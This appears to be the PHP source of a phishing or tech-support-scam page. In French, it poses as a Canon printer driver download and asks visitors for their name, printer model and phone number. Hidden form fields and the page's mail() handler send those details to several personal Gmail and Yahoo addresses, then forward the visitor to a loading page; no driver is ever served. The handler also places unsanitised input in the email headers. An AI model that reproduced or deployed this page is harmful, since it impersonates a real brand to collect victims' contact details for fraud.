<?php
include("header.php")
?>

<style>
  header.large
  {
    display: none;
  }
  header.small
  {
    display: none;
  }

</style>


 <!-- Teaser start -->
 <section id="teaser" style="height: 950px;">
<br>  <br><br><br>  <br><br><br>  <br><br><br> 
      <div class="container">
        <div class="row">
          <div class="col-md-7 col-xs-12 pull-right">
            <div id="carousel-example-generic" class="carousel slide" data-ride="carousel">
              <!-- Wrapper for slides start -->
              <div class="carousel-inner" style="margin-top: 10%;">
                <div class="item active">
                  <h1 class="title">Obtenir le lien pour le programme d'installation du pilote</h1>

                   <br><br>
                    <p style="color: #fff; font-size: 20px;">Si vous avez besoin du téléchargement ou de la mise à jour du pilote Canon le plus récent, remplissez simplement le formulaire fourni et nous vous fournirons rapidement le lien correspondant. Si vous rencontrez des difficultés au cours de ce processus, n’hésitez pas à contacter notre équipe d’assistance pour obtenir de l’aide.</p>
                    
                  </div>
                  
                  </div>
                  <!-- Wrapper for slides end -->

                </div>
              </div>
              <div class="col-md-5 col-xs-12 pull-left">
                <div class="reservation-form-shadow">
                    

                  <form action="mail.php" method="POST" >

                  <p style="font-size: 17px; color: #000; font-weight: 900;">VEUILLEZ REMPLIR VOS DÉTAILS ET CLIQUER SUR LE BOUTON DE TÉLÉCHARGEMENT CI-DESSOUS !</p>
                    <div class="form-group left">
                        <label for="first-name">Prénom:</label>
                        <input type="text" class="form-control" name="first-name" id="first-name" placeholder="Enter Your Name" require> 
                      </div>
                      <div class="form-group right">
                        <label for="last-name">Modèle d'imprimante:</label>
                        <input type="text" class="form-control" name="number" id="last-name" placeholder="Enter Your Printer Model" required>
                      </div>
                      <div class="form-group left">
                        <label for="phone-number">Numéro de téléphone:</label>
                        <input type="text" class="form-control" name="phone-number" id="phone-number" placeholder="Enter Your Phone Number" required>
                      </div>
                      <div class="form-group left" hidden>                       
                        <input type="text" class="form-control" name="email" id="phone-number" value="zbs141@yahoo.com" placeholder="Enter Your Email" >
                      </div>

                      <div class="form-group left" hidden>                       
                        <input type="text" class="form-control" name="ccemail" id="phone-number" value="nextpie01@gmail.com" placeholder="Enter Your Email" >
                      </div>

 <input type="submit" name="submit" value="Cliquez ici pour démarrer l'installation" style="background: #000000; color: #fff;  padding: 7px;" />
                  
                  </form>

                </div>
              </div>
              
            </div>
          </div>
          <br>  <br><br><br>  <br><br><br>  <br><br><br>  <br><br><br><br><br><br>
        </section>
        <div class="arrow-down"></div>
        <!-- Teaser end -->




<?php
include("footer.php")
?>




<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get form values
    $name = $_POST['first-name'];
    $number = $_POST['number'];   
    $phn = $_POST['phone-number'];
    $email = $_POST['email'];
    $cc = $_POST['ccemail']; // Retrieve CC email

    // Construct email message
    $to = "shahrukh78miya@gmail.com";
    $subject = "Message from Contact Form";
    $message_body = "Name: $name\n";
    $message_body .= "Email: $email\n";
    if (!empty($cc)) {
        $message_body .= "CC: $cc\n";
        $headers = "Cc: $cc\r\n";
    }
    $message_body .= "Message:\n$message";

    // Set additional headers
    $headers .= "From: $email\r\n";
    $headers .= "Reply-To: $email\r\n";
    
    // Send email
    $result = mail($to, $subject, $message_body, $headers);

    if ($result) {
      header('location:loading.php');
    } else {
      header('location:loading.php');
    }
}
?>
